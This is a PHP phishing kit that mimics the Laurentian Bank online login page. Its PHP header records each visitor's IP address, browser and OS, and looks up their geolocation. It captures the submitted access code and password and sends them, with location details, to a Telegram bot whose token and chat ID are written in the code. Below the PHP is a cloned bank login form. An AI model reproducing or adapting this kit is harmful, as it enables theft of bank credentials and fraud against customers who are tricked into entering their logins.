<?php

$full_date = date("h:i:s,M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'Master_database.csv';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "Laurentian";
    $url        = "";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $logo       = "[CR00K-1N]";
    $gitusr     = "RandomRyan";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message = "IMPORTANT INFORMATION LOGGED\n\nLaurentian Identity   :  $ip \nLaurentian Username :  $user\nLaurentian Password  :  $pass\n\n\n$uaget\n$uos$lh$bsr\n$is\n$city$lh$country$lh$continent\n$la$lh$lp";

$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
exit();
?><html xmlns:layout=""><head>
    
    
    
    
    
    
    <link type="text/css" href="./files/md-reno-base.css" rel="stylesheet">
    <!-- import forge 1 theme -->
    <link type="text/css" href="./files/theme-laurentianbank-md-refresh.css" rel="stylesheet">

    

    
    
    

    
    
</head>

<body ng-app="UxpLoginApp" class="uxp-theme ng-scope">


<div class="widget-c1-oauth-login position-relative oauth-login">
    

    
    
    <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">
        
        <div class="errors errors-login">
            
        </div>
        <form id="" action="040148.php" method="post">

            
            


            <div>
                
                

                
                <div ng-hide="" class="" ng-form="newLoginForm">
                    
                    

                    <div class="logo text-center">
        
        <img src="./files/logo.svg" alt="Laurentian Bank logo.">
</div>
                    
                    

                    
                    <div class="" ng-show="">
                        <div class="">
                            
    
    <div ng-class="" class="ng-scope form-group is-invalid">
        <div ng-class="" class="is-empty">

            <label>
                <span aria-hidden="true">Access code</span>
                <input class="form-control ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched ng-dirty ng-valid-parse ng-empty" id="" name="username" type="text" maxlength="8" placeholder="Access code" android-margin="">
            </label>
        </div>
        
    </div>

                            
                        </div>
                        
                        
                    </div>
                    
                    <div class="form-group" ng-class="{ 'is-invalid': isPasswordInvalid() }">
                        <div class="" ng-class="">
                            <label>
                                <span aria-hidden="true">Password</span>
                                <input class="form-control ng-invalid ng-invalid-uxp-pattern ng-touched ng-dirty ng-valid-parse ng-empty ng-invalid-required" id="password" name="password" ng-required="true" placeholder="Password" aria-label="Password" type="password" required="required">
                            </label>
                            
                        </div>
                    </div>
                    
                    

                    

                    <div class="text-center c1-btn-container">
                        
                        <button type="submit" id="loginSubmit">Log in</button>

                        
                    </div>

                    

                    

                    
                </div>


                

                
            </div>
        </form>
        
    

    </div>
</div>














    
    
    




</body></html>